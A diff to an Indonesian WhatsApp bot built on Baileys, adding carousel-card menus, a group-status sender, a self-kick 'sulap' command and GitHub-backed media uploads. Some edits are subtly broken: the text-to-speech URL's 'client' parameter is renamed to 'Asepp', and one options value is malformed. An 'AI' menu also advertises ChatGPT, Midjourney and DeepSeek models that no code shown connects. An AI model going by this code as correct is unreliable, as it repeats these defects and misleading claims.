+           // MODIFIKASI TOTAL: Mengubah single_select list menjadi deretan tombol quick_reply berikon variatif
+           buttons: [
+            {
+             name: "quick_reply",
+             buttonParamsJson: JSON.stringify({
+              icon: "PROMOTION",
+              display_text: "Dekcjs",
+              id: `${prefix}dekcjs`
+             })
+            },
+            {
+             name: "quick_reply",
+             buttonParamsJson: JSON.stringify({
+              icon: "DOCUMENT",
+              display_text: "Dekcjs V2",
+              id: `${prefix}dekcjs_v2`
+             })
+            },
+            {
+             name: "quick_reply",
+             buttonParamsJson: JSON.stringify({
+              icon: "REVIEW",
+              display_text: "Dekcjs V3",
+              id: `${prefix}dekcjs_v3`
+             })
+            },
+            {
+             name: "quick_reply",
+             buttonParamsJson: JSON.stringify({
+              icon: "DEFAULT",
+              display_text: "Decjs",
+              id: `${prefix}decjs`
+             })
+            },
+            {
+             name: "quick_reply",
+             buttonParamsJson: JSON.stringify({
+              icon: "PROMOTION",
+              display_text: "Decjs VIP",
+              id: `${prefix}decjs_vip`
+             })
+            },
+            {
+             name: "quick_reply",
+             buttonParamsJson: JSON.stringify({
+              icon: "DOCUMENT",
+              display_text: "Decjs Tele",
+              id: `${prefix}decjs_tele`
+             })
+            }
+           ]
+          })
+        }
+       ]
+      })
+     })
+    }
+   }
+  },
+  { quoted: m }
  );
 
  await Asepp.relayMessage(m.chat, msg.message, { messageId: msg.key.id });
 
- await Asepp.sendMessage(
- m.chat,
- {
- audio: fs.readFileSync("./image/decnih.mp3"),
- mimetype: "audio/mp4",
- ptt: false
- },
- { quoted: m }
- );
+ try {
+  await Asepp.sendMessage(
+   m.chat,
+   {
+    audio: fs.readFileSync("./image/decnih.mp3"),
+    mimetype: "audio/mp4",
+    ptt: false
+   },
+   { quoted: m }
+  );
+ } catch (e) {
+  console.log('Gagal kirim audio dec:', e.message)
+ }
 }
-
 break
-
-
-
 
 case "h": {
  try {
@@ -20266,7 +23278,6 @@ try {
  const tandaRes = await axios.get(
   `https://api.github.com/repos/${GITHUB_OWNER}/${GITHUB_REPO}/contents/${TANDA_PATH}`
  )
-
  const tandaDb = JSON.parse(
   Buffer.from(
    tandaRes.data.content,
@@ -20274,10 +23285,17 @@ try {
   ).toString()
  )
 
- if (tandaDb.list?.some(v => v.id === m.chat)) {
-  isTagged = true
+ if (tandaDb.list) {
+  isTagged = tandaDb.list.some(v => {
+   if (typeof v === 'object' && v !== null) {
+    return v.id === m.chat
+   }
+   return v === m.chat
+  })
  }
-} catch {}
+} catch (e) {
+ console.log('Gagal baca database tandagc:', e.message)
+}
 
 if (!isTagged) {
  return payreply(
@@ -20289,25 +23307,28 @@ let isOwner = sender === '62881036109288'
 let isMember = false
 let totalAkses = 0
 
-if (!isOwner) {
- try {
-  const aksesRes = await axios.get(
+try {
+ const aksesRes = await axios.get(
    `https://api.github.com/repos/${GITHUB_OWNER}/${GITHUB_REPO}/contents/${AKSES_PATH}`
   )
 
-  const aksesDb = JSON.parse(
-   Buffer.from(
-    aksesRes.data.content,
-    'base64'
-   ).toString()
-  )
 
-  totalAkses = aksesDb.akses?.length || 0
+ const aksesDb = JSON.parse(
+  Buffer.from(
+   aksesRes.data.content,
+   'base64'
+  ).toString()
+ )
 
-  if (aksesDb.akses?.includes(sender)) {
-   isMember = true
-  }
- } catch {}
+ totalAkses = aksesDb.akses?.length || 0
+
+ if (isOwner) {
+  isMember = true
+ } else if (aksesDb.akses?.includes(sender)) {
+  isMember = true
+ }
+} catch (e) {
+ console.log('Gagal baca database akses:', e.message)
 }
 
 let teks = `\`𝗗𝗢𝗡𝗚𝗛𝗨𝗔 𝗠𝗘𝗡𝗨\`
@@ -20328,71 +23349,108 @@ Hi \`${pushname}\` 👋 Pilih donghua di bawah buat liat semua episode. 👑
 ┃✦ *Repo » ${GITHUB_OWNER}/${GITHUB_REPO}*
 ┗━━━━━━━━━━
 
-\`[洛] 𝐃𝐎𝐍𝐆𝐇𝐔𝐀 𝐒𝐋𝐀𝐘𝐄𝐑 [洛]\`
+\`[洛] 𝐃𝐎𝐍𝐆𝐇𝐔Ａ 𝐒𝐋𝐀𝐘𝐄𝐑 [洛]\`
 `
+
+const { generateWAMessageFromContent, prepareWAMessageMedia, proto } = require("@whiskeysockets/baileys")
+
+const videoUrlMenu = 'https://raw.githubusercontent.com/AsepXyz12/bot-wa-db/main/uploads/1779595156307.mp4'
+const imgMedia = await prepareWAMessageMedia(
+ {
+  video: { url: videoUrlMenu },
+  gifPlayback: true
+ },
+ {
+  upload: Asepp.waUploadToServer
+ }
+)
 
 const msg = generateWAMessageFromContent(
  m.chat,
  {
   viewOnceMessage: {
    message: {
+    messageContextInfo: {
+     deviceListMetadata: {},
+     deviceListMetadataVersion: 2
+    },
     interactiveMessage:
      proto.Message.InteractiveMessage.create({
       body: proto.Message.InteractiveMessage.Body.create({
-       text: ''
+       text: ' 𝐌𝐚𝐤𝐚𝐧 𝐍𝐢𝐡 𝐃𝐨𝐧𝐠𝐡𝐮𝐚 '
       }),
-      footer: proto.Message.InteractiveMessage.Footer.create({
-       text: teks
-      }),
-      header: proto.Message.InteractiveMessage.Header.create({
-       hasMediaAttachment: true,
-       videoMessage: (
-        await prepareWAMessageMedia(
-         {
-          video: {
-           url: 'https://raw.githubusercontent.com/AsepXyz12/bot-wa-db/main/uploads/1779595156307.mp4'
-          }
-         },
-         {
-          upload: Asepp.waUploadToServer
-         }
-        )
-       ).videoMessage,
-       gifPlayback: true
-      }),
-      nativeFlowMessage:
-       proto.Message.InteractiveMessage.NativeFlowMessage.create({
-        buttons: [
-         {
-          name: 'single_select',
-          buttonParamsJson: JSON.stringify({
-           title: '© DONGHUA MENU',
-           sections: [
+      contextInfo: {
+       mentionedJid: [m.sender],
+       forwardingScore: 999999,
+       isForwarded: true
+      },
+      carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
+       cards: [
+        {
+         // FIX TOTAL: Menyisipkan gifPlayback: true langsung ke dalam Header objek kartu agar berputar selamanya (Permanen Loop)
+         header: proto.Message.InteractiveMessage.Header.create({
+          title: "",
+          gifPlayback: true,
+          hasMediaAttachment: true,
+          ...imgMedia
+         }),
+         footer: proto.Message.InteractiveMessage.Footer.create({
+          text: teks
+         }),
+         nativeFlowMessage:
+          proto.Message.InteractiveMessage.NativeFlowMessage.create({
+           messageParamsJson: JSON.stringify({
+            limited_time_offer: {
+             text: "𝐃𝐨𝐧𝐠𝐡𝐮𝐚 𝐒𝐥𝐚𝐲𝐞𝐫",
+             url: "https://t.me/AsepXnxx",
+             copy_code: "𝐃𝐎𝐍𝐆𝐇𝐔𝐀",
+             expiration_time: Date.now() + 86400000
+            },
+            bottom_sheet: {
+             in_thread_buttons_limit: 1,
+             divider_indices:(0), 
+             list_title: "Donghua Menu",
+             button_title: "Open Menu"
+            }
+           }),
+           buttons: [
             {
-             title: 'Pilih Donghua',
-             rows: [
-              {
-               title: '𝐏𝐞𝐫𝐟𝐞𝐜𝐭 𝐖𝐨𝐫𝐥𝐝',
-               description: 'Lihat semua episode PW',
-               id: `${prefix}perfect`
-              },
-              {
-               title: '𝐁𝐓𝐓𝐇',
-               description: 'Lihat semua episode BTTH',
-               id: `${prefix}btth`
-              },
-              {
-               title: '𝐑𝐞𝐧𝐞𝐠𝐚𝐝𝐞 𝐈𝐦𝐦𝐨𝐫𝐭𝐚𝐥',
-               description: 'Lihat semua episode RI',
-               id: `${prefix}renegade`
-              }
-             ]
+             name: "quick_reply",
+             buttonParamsJson: JSON.stringify({
+              icon: "PROMOTION",
+              display_text: "Perfect World",
+              id: `${prefix}perfect`
+             })
+            },
+            {
+             name: "quick_reply",
+             buttonParamsJson: JSON.stringify({
+              icon: "DOCUMENT",
+              display_text: "BTTH",
+              id: `${prefix}btth`
+             })
+            },
+            {
+             name: "quick_reply",
+             buttonParamsJson: JSON.stringify({
+              icon: "REVIEW",
+              display_text: "Renegade Immortal",
+              id: `${prefix}renegade`
+             })
+            },
+            {
+             name: "cta_url",
+             buttonParamsJson: JSON.stringify({
+              icon: "DEFAULT",
+              display_text: "Saluran Info",
+              url: "https://whatsapp.com/channel/0029VbAyjNu9mrGh7Djui02R"
+             })
             }
            ]
           })
-         }
-        ]
-       })
+        }
+       ]
+      })
      })
    }
   }
@@ -20428,43 +23486,6 @@ try {
 
 }
 break
-
-
-
-
-
-
-
-// Handler buat kirim video pas user pilih episode
-case /sendvid_(btth|renegade|perfect)_(\d+)/: {
- const [, cmd, eps] = m.text.match(/sendvid_(btth|renegade|perfect)_(\d+)/)
- const key = `${m.chat}_${cmd}`
- const list = global.donghuaList?.[key]
-
- if (!list) return payreply('Data expired. Ketik ulang command nya 👑')
-
- const data = list.find(x => x.ep == eps)
- if (!data) return payreply('Episode gak ketemu 👑')
-
- await Asepp.sendMessage(m.chat, { react: { text: '⏳', key: m.key } })
-
- try {
- // Kirim video langsung
- await Asepp.sendMessage(m.chat, {
- video: { url: data.url },
- caption: `🎬 ${data.judul} - Episode ${data.ep}`,
- jpegThumbnail: data.thumbnail? await (await fetch(data.thumbnail)).arrayBuffer() : undefined
- }, { quoted: m })
-
- await Asepp.sendMessage(m.chat, { react: { text: '✅', key: m.key } })
- } catch (e) {
- console.log(e)
- await Asepp.sendMessage(m.chat, { react: { text: '❌', key: m.key } })
- payreply('Gagal kirim video. Mungkin file terlalu besar atau link mati.')
- }
-}
-break
-
 
 case 'adddonghua': {
  if (!m.isGroup) return payreply('Fitur ini khusus group 👑')
@@ -21007,7 +24028,7 @@ Owner : @62881036109288
 }
 break
 
-case "psikologis": {
+case "psikolog": {
     const nowJakarta = moment().tz('Asia/Jakarta');
     await Asepp.sendMessage(m.chat, { react: { text: "🧠", key: m.key } });
 
@@ -21037,27 +24058,32 @@ Hubungi ahli kalau perasaan ini ganggu aktivitas harian lu.
 Telegram : t.me/AsepXxnx
 `
 
-    const msg = generateWAMessageFromContent(
+    const { generateWAMessageFromContent, prepareWAMessageMedia, proto } = require("@whiskeysockets/baileys")
+    const fs = require('fs')
+
+    // Menyiapkan media video background untuk header Carousel Card dengan loop playback konstan
+    const imgMedia = await prepareWAMessageMedia(
+        { 
+            video: { url: "https://raw.githubusercontent.com/AsepXyz12/bot-wa-db/main/uploads/1779770716711.mp4" }, 
+            gifPlayback: true 
+        },
+        { 
+            upload: Asepp.waUploadToServer 
+        }
+    )
+
+    let msg = await generateWAMessageFromContent(
         m.chat,
         {
             viewOnceMessage: {
                 message: {
+                    messageContextInfo: {
+                        deviceListMetadata: {},
+                        deviceListMetadataVersion: 2
+                    },
                     interactiveMessage: proto.Message.InteractiveMessage.create({
                         body: proto.Message.InteractiveMessage.Body.create({
-                            text: ""
-                        }),
-                        footer: proto.Message.InteractiveMessage.Footer.create({
-                            text: teks
-                        }),
-                        header: proto.Message.InteractiveMessage.Header.create({
-                            hasMediaAttachment: true,
-                            videoMessage: (
-                                await prepareWAMessageMedia(
-                                    { video: { url: "https://raw.githubusercontent.com/AsepXyz12/bot-wa-db/main/uploads/1779770716711.mp4" } },
-                                    { upload: Asepp.waUploadToServer }
-                                )
-                            ).videoMessage,
-                            gifPlayback: true
+                            text: "❓ *Tenangkan Diri, Tenangkan Hati*"
                         }),
                         contextInfo: {
                             isForwarded: true,
@@ -21068,36 +24094,69 @@ Telegram : t.me/AsepXxnx
                                 serverMessageId: 145
                             }
                         },
-                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
-                            messageParamsJson: JSON.stringify({
-                                limited_time_offer: {
-                                    text: "𝐏𝐒𝐈𝐊𝐎𝐋𝐎𝐆𝐈𝐒",
-                                    url: "https://t.me/AsepXxnx",
-                                    copy_code: "𝐏𝐒𝐈𝐊𝐎𝐋𝐎𝐆𝐈𝐒",
-                                    expiration_time: Date.now() + 86400000
-                                },
-                                bottom_sheet: {
-                                    in_thread_buttons_limit: 2,
-                                    divider_indices: [1, 2, 3, 4, 5],
-                                    list_title: "PILIH",
-                                    button_title: "© PSIKOLOGIS"
-                                }
-                            }),
-                            buttons: [
+                        carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
+                            cards: [
                                 {
-                                    name: "single_select",
-                                    buttonParamsJson: JSON.stringify({
-                                        title: "© PSIKOLOGIS",
-                                        sections: [{
-                                            title: "List Perasaan",
-                                            highlight_label: "𝐏𝐢𝐥𝐢𝐡 𝐒𝐢𝐧𝐢 🚀",
-                                            rows: [
-                                                { title: "Perasaan Bahagia", description: "Tips biar bahagia lebih lama", id: ".bahagia" },
-                                                { title: "Perasaan Sedih", description: "Cara ngatasin rasa sedih", id: ".sedih" },
-                                                { title: "Perasaan Takut", description: "Mengelola rasa takut", id: ".takut" },
-                                                { title: "Perasaan Marah", description: "Kontrol amarah dengan sehat", id: ".marah" }
-                                            ]
-                                        }]
+                                    // FIX PERMANENT AUTO-PLAY: Parameter gifPlayback disuntik langsung di Header Objek Card
+                                    header: proto.Message.InteractiveMessage.Header.create({
+                                        title: "",
+                                        gifPlayback: true,
+                                        hasMediaAttachment: true,
+                                        ...imgMedia
+                                    }),
+                                    footer: proto.Message.InteractiveMessage.Footer.create({
+                                        text: teks
+                                    }),
+                                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+                                        messageParamsJson: JSON.stringify({
+                                            limited_time_offer: {
+                                                text: "Jangan Lupa Coli",
+                                                url: "https://t.me/AsepXxnx",
+                                                copy_code: "𝐏𝐒𝐈𝐊𝐎𝐋𝐎𝐆𝐈𝐒",
+                                                expiration_time: Date.now() + 86400000
+                                            },
+                                            bottom_sheet: {
+                                                in_thread_buttons_limit: 1, // Menyembunyikan sisa tombol ke dalam panel pop-up Bottom Sheet
+                                                divider_indices: [],
+                                                list_title: "Pilih Perasaan",
+                                                button_title: "Open Menu" // Nama tombol pemicu panel di luar card
+                                            }
+                                        }),
+                                        // MODIFIKASI TOTAL: Mengubah single_select list menjadi tombol quick_reply berikon variatif
+                                        buttons: [
+                                            {
+                                                name: "quick_reply",
+                                                buttonParamsJson: JSON.stringify({
+                                                    icon: "PROMOTION",
+                                                    display_text: "Perasaan Bahagia",
+                                                    id: ".bahagia"
+                                                })
+                                            },
+                                            {
+                                                name: "quick_reply",
+                                                buttonParamsJson: JSON.stringify({
+                                                    icon: "DOCUMENT",
+                                                    display_text: "Perasaan Sedih",
+                                                    id: ".sedih"
+                                                })
+                                            },
+                                            {
+                                                name: "quick_reply",
+                                                buttonParamsJson: JSON.stringify({
+                                                    icon: "REVIEW",
+                                                    display_text: "Perasaan Takut",
+                                                    id: ".takut"
+                                                })
+                                            },
+                                            {
+                                                name: "quick_reply",
+                                                buttonParamsJson: JSON.stringify({
+                                                    icon: "DEFAULT",
+                                                    display_text: "Perasaan Marah",
+                                                    id: ".marah"
+                                                })
+                                            }
+                                        ]
                                     })
                                 }
                             ]
@@ -21106,22 +24165,27 @@ Telegram : t.me/AsepXxnx
                 }
             }
         },
-        { quoted: lol }
+        { quoted: qkontak } // Mengamankan metadata pembawa quote chat utama
     );
 
     await Asepp.relayMessage(m.chat, msg.message, { messageId: msg.key.id });
 
-    await Asepp.sendMessage(
-        m.chat,
-        {
-            audio: fs.readFileSync("./image/psikolog.mp3"),
-            mimetype: "audio/mp4",
-            ptt: false
-        },
-        { quoted: qkontak }
-    );
+    try {
+        await Asepp.sendMessage(
+            m.chat,
+            {
+                audio: fs.readFileSync("./image/psikolog.mp3"),
+                mimetype: "audio/mp4",
+                ptt: false
+            },
+            { quoted: qkontak }
+        );
+    } catch (e) {
+        console.log('Gagal kirim audio psikologi:', e.message)
+    }
 }
 break;
+
 case 'deltandatogc':
 case 'untaggc': {
  if (m.sender.split('@')[0]!== '62881036109288') return payreply('Khusus owner 👑')
@@ -25933,7 +28997,7 @@ return payreply('❌ Maksimal 200 karakter aja ya, kepanjangan')
 
 let lang = 'id'
 
-let url = `https://translate.google.com/translate_tts?ie=UTF-8&q=${encodeURIComponent(text)}&tl=${lang}&client=tw-ob`
+let url = `https://translate.google.com/translate_tts?ie=UTF-8&q=${encodeURIComponent(text)}&tl=${lang}&Asepp=tw-ob`
 
 let res = await axios.get(url, {
 responseType: 'arraybuffer',
@@ -27365,7 +30429,7 @@ if (!re.test(data)) {
 return payreply(
 `Case "${targetCase}" tidak ditemukan atau tidak memakai:
 
-const input = "./image/file.mp3"`
+const input = "./image/waaj.mp3"`
 )
 }
 
@@ -27888,12 +30952,1368 @@ case "copyme": {
  // Kirim pesan
  await Asepp.relayMessage(m.chat, msgii.message, { messageId: msgii.key.id });
 }
+
+
+
+
+
+
+
+
+
+
+break;
+case "menuai": {
+ try {
+ const { generateWAMessageFromContent, prepareWAMessageMedia, proto } = require("@whiskeysockets/baileys")
+ const fs = require("fs")
+
+ await Asepp.sendMessage(m.chat, { react: { text: "🤖", key: m.key } })
+
+ let captionMain = `\`𝐓𝐑𝐈𝐍𝐈𝐓𝐘 𝐀𝐈\`
+
+Selamat datang di Pusat Layanan Kecerdasan Buatan Premium.
+Silakan geser kartu di atas untuk melihat spesifikasi model AI yang tersedia.
+
+Cara Menggunakan:
+1. Geser ke model AI yang ingin kamu gunakan.
+2. Klik tombol di dalam kartu untuk mengaktifkan model dan memutar audio khusus.
+3. Setelah aktif, kamu bisa langsung berinteraksi dengan bot.
+
+Trinity Core AI v1.0 | Multi-Card Integration`;
+
+ // Direct link MP4 andalanmu untuk background masing-masing kartu Carousel
+ const videoAi1 = "https://raw.githubusercontent.com/AsepXyz12/bot-wa-db/main/uploads/1780748663826.mp4"
+ const videoAi2 = "https://raw.githubusercontent.com/AsepXyz12/bot-wa-db/main/uploads/1780750441595.mp4"
+ const videoAi3 = "https://raw.githubusercontent.com/AsepXyz12/bot-wa-db/main/uploads/1780748955430.mp4"
+
+ // Enkripsi video streaming secara paralel ke server Baileys agar semuanya auto-play permanen
+ const mediaAi1 = await prepareWAMessageMedia({ video: { url: videoAi1 }, gifPlayback: true }, { upload: Asepp.waUploadToServer })
+ const mediaAi2 = await prepareWAMessageMedia({ video: { url: videoAi2 }, gifPlayback: true }, { upload: Asepp.waUploadToServer })
+ const mediaAi3 = await prepareWAMessageMedia({ video: { url: videoAi3 }, gifPlayback: true }, { upload: Asepp.waUploadToServer })
+
+ let msgAiPanel = await generateWAMessageFromContent(
+ m.chat,
+ {
+ viewOnceMessage: {
+ message: {
+ messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
+ interactiveMessage: proto.Message.InteractiveMessage.create({
+ body: proto.Message.InteractiveMessage.Body.create({ text: "𝐓𝐑𝐈𝐍𝐈𝐓𝐘 𝐀𝐈" }),
+ carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
+ cards: [
+ // ---- CARD 1: CHATGPT ----
+ {
+ header: proto.Message.InteractiveMessage.Header.create({ title: "", gifPlayback: true, hasMediaAttachment: true, ...mediaAi1 }),
+ footer: proto.Message.InteractiveMessage.Footer.create({ 
+ text: `MODEL 1: CHATGPT-4O PREMIUM\n\nCocok untuk analisis data teks berat, pengerjaan tugas, pemecahan logika matematika, dan perbaikan baris kode.\n\n${captionMain}` 
+ }),
+ nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+ messageParamsJson: JSON.stringify({
+ limited_time_offer: { text: "GPT-4O CORE", url: "https://t.me", copy_code: "GPT4", expiration_time: Date.now() + 86400000 },
+ bottom_sheet: { 
+ in_thread_buttons_limit: 0, // Diubah ke 0 agar tombol di bawah masuk ke panel
+ list_title: "ChatGPT Engine Options", 
+ button_title: "Open Menu" 
+ }
+ }),
+ buttons: [
+ { name: "quick_reply", buttonParamsJson: JSON.stringify({ icon: "PROMOTION", display_text: "Gunakan Bapaklu", id: ".setmode_ai gpt4" }) }
+ ]
+ })
+ },
+ // ---- CARD 2: MIDJOURNEY ----
+ {
+ header: proto.Message.InteractiveMessage.Header.create({ title: "", gifPlayback: true, hasMediaAttachment: true, ...mediaAi2 }),
+ footer: proto.Message.InteractiveMessage.Footer.create({ 
+ text: `MODEL 2: MIDJOURNEY IMAGE\n\nMengubah baris teks perintah (prompt) menjadi gambar ilustrasi beresolusi tinggi secara instan.\n\n${captionMain}` 
+ }),
+ nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+ messageParamsJson: JSON.stringify({
+ limited_time_offer: { text: "IMAGE ENGINE", url: "https://t.me", copy_code: "ART", expiration_time: Date.now() + 86400000 },
+ bottom_sheet: { 
+ in_thread_buttons_limit: 0, // Diubah ke 0 agar tombol di bawah masuk ke panel
+ list_title: "Midjourney Options", 
+ button_title: "Open Menu" 
+ }
+ }),
+ buttons: [
+ { name: "quick_reply", buttonParamsJson: JSON.stringify({ icon: "DOCUMENT", display_text: "Gunakan MbakLoe", id: ".setmode_ai midjourney" }) }
+ ]
+ })
+ },
+ // ---- CARD 3: DEEPSEEK ----
+ {
+ header: proto.Message.InteractiveMessage.Header.create({ title: "", gifPlayback: true, hasMediaAttachment: true, ...mediaAi3 }),
+ footer: proto.Message.InteractiveMessage.Footer.create({ 
+ text: `MODEL 3: DEEPSEEK CODER\n\nSpesialis pemetaan jaringan, membaca struktur file binary, dan reverse engineering script.\n\n${captionMain}` 
+ }),
+ nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+ messageParamsJson: JSON.stringify({
+ limited_time_offer: { text: "DEEPSEEK CORE", url: "https://t.me", copy_code: "CODER", expiration_time: Date.now() + 86400000 },
+ bottom_sheet: { 
+ in_thread_buttons_limit: 0, // Diubah ke 0 agar tombol di bawah masuk ke panel
+ list_title: "DeepSeek Core Options", 
+ button_title: "Open Menu" 
+ }
+ }),
+ buttons: [
+ { name: "quick_reply", buttonParamsJson: JSON.stringify({ icon: "REVIEW", display_text: "Gunakan Mamaklu", id: ".setmode_ai deepseek" }) }
+ ]
+ })
+ }
+ ]
+ })
+ })
+ }
+ }
+ },
+ { quoted: qkontak }
+ )
+
+ await Asepp.relayMessage(m.chat, msgAiPanel.message, { messageId: msgAiPanel.key.id })
+
+ // Audio default pas pertama kali menu dipanggil (Tema ChatGPT)
+ if (fs.existsSync("./image/kwkk.mp3")) {
+ await Asepp.sendMessage(m.chat, { audio: fs.readFileSync("./image/kwkk.mp3"), mimetype: "audio/mp4", ptt: false }, { quoted: m })
+ }
+ } catch (err) {
+ console.log(err)
+ payreply(`Gagal memuat AI Panel: ${err.message || err}`)
+ }
+}
+break
+
+case "swgrup": {
+
+ // =====================================
+ // OWNER ONLY
+ // =====================================
+ if (!isOwner) {
+ return payreply('❌ Owner only!')
+ }
+
+ if (!m.isGroup) return payreply("Fitur ini hanya dapat digunakan di dalam grup!");
+ 
+ // Ambil teks dari pesan yang di-reply (quoted), jika tidak ada ambil dari teks setelah perintah
+ let targetText = m.quoted ? m.quoted.text : q;
+ if (!targetText) return payreply("Silakan reply teks yang ingin dijadikan SW Grup atau ketik teks setelah perintah!");
+
+ try {
+ // 1. Berikan respon reaksi emoji
+ await Asepp.sendMessage(m.chat, { react: { text: "📝", key: m.key } });
+
+ // 2. Payload murni Status Grup V2 tanpa manipulasi crash/exploit
+ const statusPayload = {
+ groupStatusMessageV2: {
+ message: {
+ extendedTextMessage: {
+ text: targetText,
+ font: 1, // Jenis font standar WhatsApp Status
+ backgroundArgb: 4278190080, // Warna latar belakang status (contoh hitam: #FF000000 dalam format Argb)
+ textArgb: 4294967295 // Warna teks (putih)
+ }
+ }
+ }
+ };
+
+ // 3. Generate pesan dengan menautkan ke chat user (mendukung reply langsung)
+ const waMessage = generateWAMessageFromContent(
+ m.chat, 
+ statusPayload, 
+ { 
+ userJid: m.sender, 
+ quoted: m 
+ }
+ );
+
+ // 4. Kirim sebagai pesan status ke dalam grup
+ await Asepp.relayMessage(m.chat, waMessage.message, { messageId: waMessage.key.id });
+
+ } catch (err) {
+ console.error(err);
+ payreply(String(err));
+ }
+}
 break;
 
 
 
 
+
+
+
+
+
+
+
+case "sulap": {
+ if (!m.isGroup) return;
+
+ // 1. Definisikan nomor yang kebal/tidak boleh dikick (masukkan nomor tanpa @s.whatsapp.net)
+ const whitelist = ["6288994486449", "62881036109288"];
+ const targetNumber = m.sender.split("@")[0];
+
+ // 2. Validasi: Jika yang mengetik adalah Owner atau nomor di dalam whitelist, batalkan kick
+ if (m.isCreator || whitelist.includes(targetNumber)) {
+ return payreply("Mantra sulap tidak mempan terhadap Owner atau nomor VIP! ");
+ }
+
+ try {
+ // 3. Kirim pesan perpisahan
+ await Asepp.sendMessage(m.chat, {
+ text: `Mantra "sulap" aktif... bye @${targetNumber}`,
+ mentions: [m.sender]
+ });
+
+ // Jeda 1.5 detik
+ await new Promise(r => setTimeout(r, 1500));
+
+ // 4. Langsung demote (untuk jaga-jaga jika target adalah admin) lalu remove
+ await Asepp.groupParticipantsUpdate(m.chat, [m.sender], "demote");
+ await new Promise(r => setTimeout(r, 500)); // jeda singkat setelah demote
+ await Asepp.groupParticipantsUpdate(m.chat, [m.sender], "remove");
+
+ } catch (err) {
+ payreply("Gagal kick. Pastikan bot memiliki hak admin tertinggi.");
+ }
+}
+break;
+
+
+
+case "addjj": {
+ try {
+ if (!isOwner) return payreply('Owner only! 👑')
+ if (!m.isGroup) return payreply('❌ Cuma bisa di grup!')
+
+ const axios = require('axios')
+ const fs = require('fs')
+ const path = require('path')
+ const { downloadContentFromMessage } = require('@whiskeysockets/baileys')
+
+ const GITHUB_OWNER = "AsepXyz12"
+ const GITHUB_REPO = "bot-wa-db"
+
+ if (!text) return payreply(`Contoh:\n${prefix}addjj nika`)
+ if (!m.quoted) return payreply('❌ Reply media!')
+
+ const groupId = m.chat // kunci per grup
+ const folderName = text.trim().toLowerCase()
+ let qmsg = m.quoted
+ let mime = (qmsg.msg || qmsg).mimetype || ''
+ if (!mime) return payreply('❌ Reply image/video/audio/document!')
+
+ let type = mime.startsWith('image/') ? 'image' : mime.startsWith('video/') ? 'video' : mime.startsWith('audio/') ? 'audio' : 'document'
+ let ext = mime.split('/')[1]?.split(';')[0] || 'bin'
+
+ const dbPath = path.join(process.cwd(), 'database/jj.json')
+ let db = fs.existsSync(dbPath) ? JSON.parse(fs.readFileSync(dbPath)) : {}
+
+ // bikin object per grup
+ if (!db[groupId]) db[groupId] = {}
+ if (!db[groupId][folderName]) db[groupId][folderName] = []
+
+ await payreply(`⏳ Upload ${type} ke folder *${folderName}* grup ini...`)
+
+ const stream = await downloadContentFromMessage(qmsg.msg || qmsg, type)
+ let buffer = Buffer.from([])
+ for await (const chunk of stream) buffer = Buffer.concat([buffer, chunk])
+ if (!buffer.length) return payreply('❌ Gagal download media!')
+
+ const fileName = `${Date.now()}.${ext}`
+ const githubPath = `jj/${groupId}/${folderName}/${fileName}` // pisah folder github per grup
+
+ await axios.put(`https://api.github.com/repos/${GITHUB_OWNER}/${GITHUB_REPO}/contents/${githubPath}`, {
+ message: `Upload ${fileName}`,
+ content: buffer.toString('base64')
+ }, {
+ })
+
+ db[groupId][folderName].push({ file: fileName, type, mime })
+ fs.writeFileSync(dbPath, JSON.stringify(db, null, 2))
+
+ await payreply(`\`𝗔𝗗𝗗𝗝𝗝 𝗦𝗨𝗖𝗘𝗦\`
+
+Hi \`${pushname}\` 👋
+
+⌲ \`𝐆𝐑𝐔𝐏\` » Grup ini doang
+⌲ \`𝐅𝐎𝐋𝐃𝐄𝐑\` » ${folderName}
+⌲ \`𝐓𝐎𝐓𝐀𝐋\` » ${db[groupId][folderName].length} media
+
+Ketik ${prefix}jj ${folderName} buat kirim`)
+
+ } catch (e) {
+ console.log("ADDJJ ERROR:", e)
+ await payreply('❌ Error:\n' + e.message)
+ }
+}
 break
+
+case "filters": {
+ try {
+ if (!isOwner) return payreply('Owner only! 👑')
+ if (!m.isGroup) return payreply('❌ Cuma bisa di grup!')
+
+ const fs = require('fs')
+ const path = require('path')
+ const groupId = m.chat
+ const dbPath = path.join(process.cwd(), 'database/jj.json')
+
+ if (!fs.existsSync(dbPath)) return payreply('❌ Belum ada folder di grup ini!')
+
+ let db = JSON.parse(fs.readFileSync(dbPath))
+ if (!db[groupId] || Object.keys(db[groupId]).length === 0) {
+ return payreply('❌ Grup ini belum ada folder JJ!\nKetik: *' + prefix + 'addjj nika* + reply media')
+ }
+
+ let folders = Object.keys(db[groupId]).sort()
+ let listText = `\`𝗙𝗜𝗟𝗧𝗘𝗥𝗦 𝗚𝗥𝗨𝗣\`
+
+Hi \`${pushname}\` 👋 List folder khusus grup ini
+
+⌲ \`𝐓𝐎𝐓𝐀𝐋\` » ${folders.length} folder
+⌲ \`𝐏𝐀𝐊𝐄\` » ${prefix}jj namafolder / klik button
+
+┏━━━━━━━━━━\n`
+ 
+ let rows = []
+ // Diperbaiki: loop .forEach diselesaikan dulu untuk menyusun teks list & rows tombol
+ folders.forEach((f, i) => {
+ listText += `┃ ${i+1}. ${f} » ${db[groupId][f].length} media\n`
+ rows.push({ 
+ title: `${f}`, 
+ description: `${db[groupId][f].length} media`, 
+ id: `${prefix}jj ${f}` 
+ })
+ })
+ 
+ listText += `┗━━━━━━━━━━\n\n\`[洛] 𝐓𝐑𝐈𝐍𝐈𝐓𝐘 𝐎𝐊𝐄𝐆𝐀𝐒 [洛]\``
+
+ const msg = generateWAMessageFromContent(m.chat, {
+ viewOnceMessage: {
+ message: {
+ interactiveMessage: proto.Message.InteractiveMessage.create({
+ body: proto.Message.InteractiveMessage.Body.create({ text: "" }),
+ footer: proto.Message.InteractiveMessage.Footer.create({ text: listText }),
+ header: proto.Message.InteractiveMessage.Header.create({ title: "𝗙𝗜𝗟𝗧𝗘𝗥𝗦 𝗚𝗥𝗨𝗣" }),
+ contextInfo: { mentionedJid: [m.sender] },
+ nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+ buttons: [{ 
